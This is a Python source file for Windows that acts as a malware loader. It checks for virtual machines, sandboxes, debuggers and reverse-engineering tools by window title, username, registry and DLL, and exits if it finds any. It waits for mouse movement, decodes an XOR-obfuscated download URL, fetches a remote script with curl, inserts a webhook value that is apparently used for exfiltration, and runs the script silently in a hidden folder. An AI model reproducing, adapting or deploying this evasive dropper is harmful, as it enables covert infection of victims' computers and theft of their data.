import os
import sys
import ctypes
import winreg
import base64
import subprocess

from math import sqrt, pow


user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi

getTickCount = kernel32.GetTickCount
getTickCount.restype = ctypes.c_ulong


def CheckCPU() -> bool:
    class SYSTEM_INFO(ctypes.Structure):
        _fields_ = [("wProcessorArchitecture", ctypes.c_ushort),("wReserved", ctypes.c_ushort),("dwPageSize", ctypes.c_uint),("lpMinimumApplicationAddress", ctypes.c_void_p),("lpMaximumApplicationAddress", ctypes.c_void_p),("dwActiveProcessorMask", ctypes.POINTER(ctypes.c_ulong)),("dwNumberOfProcessors", ctypes.c_uint),("dwProcessorType", ctypes.c_uint),("dwAllocationGranularity", ctypes.c_uint),("wProcessorLevel", ctypes.c_ushort),("wProcessorRevision", ctypes.c_ushort)]
    system_info = SYSTEM_INFO()
    kernel32.GetSystemInfo(ctypes.byref(system_info))
    number_of_processors = system_info.dwNumberOfProcessors
    return number_of_processors >= 2

def CheckRAM() -> bool:
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_uint),("dwMemoryLoad", ctypes.c_uint),("ullTotalPhys", ctypes.c_ulonglong),("ullAvailPhys", ctypes.c_ulonglong),("ullTotalPageFile", ctypes.c_ulonglong),("ullAvailPageFile", ctypes.c_ulonglong),("ullTotalVirtual", ctypes.c_ulonglong),("ullAvailVirtual", ctypes.c_ulonglong),("sullAvailExtendedVirtual", ctypes.c_ulonglong)]
    memory_status = MEMORYSTATUSEX()
    memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    if not kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status)):
        return True
    ram_mb = memory_status.ullTotalPhys // (1024 * 1024)
    return ram_mb >= 2048

def CheckReg() -> bool:
    reg_path = r"SYSTEM\ControlSet001\Services\VBoxSF"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ):
            return False
    except FileNotFoundError:
        return True
    
def CheckNumOfProc() -> bool:
    DWORD = ctypes.c_ulong
    process_array = (DWORD * 1024)()
    cb_needed = DWORD(0)
    success = psapi.EnumProcesses(ctypes.byref(process_array),ctypes.sizeof(process_array),ctypes.byref(cb_needed))
    if not success:
        return True
    num_of_processes = cb_needed.value // ctypes.sizeof(DWORD)
    return num_of_processes >= 50

class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

def CheckMouseMove():
    previous_mouse_position = POINT()
    current_mouse_position = POINT()
    user32.GetCursorPos(ctypes.byref(previous_mouse_position))
    mouse_distance = 0.0
    while True:
        user32.GetCursorPos(ctypes.byref(current_mouse_position))
        dx = current_mouse_position.x - previous_mouse_position.x
        dy = current_mouse_position.y - previous_mouse_position.y
        mouse_distance += sqrt(pow(dx, 2) + pow(dy, 2))
        kernel32.Sleep(25)
        previous_mouse_position = POINT(current_mouse_position.x, current_mouse_position.y)
        if mouse_distance > 5:
            break

def CheckDLL():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        return False
    return True

def CheckTitles():
    EnumWindows = user32.EnumWindows
    GetWindowText = user32.GetWindowTextW
    GetWindowTextLength = user32.GetWindowTextLengthW
    IsWindowVisible = user32.IsWindowVisible
    forbidden_titles = {"proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy","titanhide", "ilspy", "titanhide", "x32dbg", "codecracker", "simpleassembly","process hacker 2", "pc-ret", "http debugger", "Centos", "process monitor","debug", "ILSpy", "reverse", "simpleassemblyexplorer", "process", "de4dotmodded","dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza","crack", "strongod", "ida -", "brute", "dump", "StringDecryptor", "wireshark","debugger", "httpdebugger", "gdb", "kdb", "x64_dbg", "windbg", "x64netdumper","petools", "scyllahide", "megadumper", "reversal", "ksdumper v1.1 - by equifox","dbgclr", "HxD", "monitor", "peek", "ollydbg", "ksdumper", "http", "wpe pro", "dbg","httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom","mdbg", "WPE PRO", "system explorer", "de4dot", "X64NetDumper", "protection_id","charles", "systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "xd","0harmony", "dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "checker","harmony", "Protection_ID", "PETools", "scyllaHide", "x96dbg", "systemexplorerservice","folder", "mitmproxy", "dbx", "sniffer", "Process Hacker", "Process Explorer","Sysinternals", "www.sysinternals.com", "binary ninja"}
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.POINTER(ctypes.c_int))
    def foreach_window(hwnd, lParam):
        length = GetWindowTextLength(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        GetWindowText(hwnd, buff, length + 1)
        title = buff.value.lower()
        if IsWindowVisible(hwnd) and title in forbidden_titles:
            print(title)
            return True
        return False
    found_forbidden = EnumWindows(EnumWindowsProc(foreach_window), 0)
    return found_forbidden

def CheckUptime(durationInSeconds=1):
    uptime = getTickCount()
    uptime = int(uptime / 1000)
    if uptime < durationInSeconds:
        return False
    else:
        return True
    
def CheckIsDebuggerPresent():
    return kernel32.IsDebuggerPresent() != 1

def CheckScreenSize():
    try:
        user32 = ctypes.windll.user32
        width = user32.GetSystemMetrics(0) 
        height = user32.GetSystemMetrics(1)

        is_small = width < 800 or height < 600
        return not is_small
    except Exception as e:
        return True
    
def CheckForBlacklistedNames():
    blacklisted_names = ["johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus", "john doe", "test user", "sand box", "wdagutilityaccount"]
    current_username = os.getenv("USERNAME", "").lower()
    if current_username in blacklisted_names:
        return False
    else:
        return True
    
def XorString(input_string: str, key: str) -> str:
    extended_key = (key * (len(input_string) // len(key) + 1))[:len(input_string)]
    xor_result = ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(input_string, extended_key))
    return xor_result

def GetPython():
    commands = ["py", "python", "python3"]
    for cmd in commands:
        try:
            result = subprocess.run([cmd, "--version"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return cmd
        except (subprocess.CalledProcessError, FileNotFoundError):
            continue

    return None



if not (CheckCPU() and CheckRAM() and CheckReg() and CheckNumOfProc() and CheckDLL() and CheckTitles() and CheckUptime() and CheckIsDebuggerPresent() and CheckScreenSize() and CheckForBlacklistedNames()):
    sys.exit()
CheckMouseMove()

pythonCmd = GetPython()

basePath = f"C:\\Users\\{os.getlogin()}\\bin"
if not os.path.exists(basePath):
    os.mkdir(basePath)

url = base64.b64decode("WUZMRkQIGxlDU0MbV15GWkBSQ0dUQFtZWUZRWEUcV1pdGHhHVF5Xd35ATF9NHUBTQkYZR1VHHUBQVkUbWVdZUkQdWVdYXBtFUU5eXVRUGERI").decode("utf-8")
url = XorString(url, "12867246124507225064")

userWebhook = "çç"

try:
    os.remove(basePath+"\\tmp.py")
except:
    pass

subprocess.run(["curl", url, "-o", basePath+"\\tmp.py"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

payload = ""
with open(basePath+"\\tmp.py", "r") as f:
    payload = f.read()

payload = payload.replace("~~", userWebhook)

with open(basePath+"\\tmp.py", "w") as f:
    f.write(payload)

subprocess.run([pythonCmd, basePath+"\\tmp.py"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)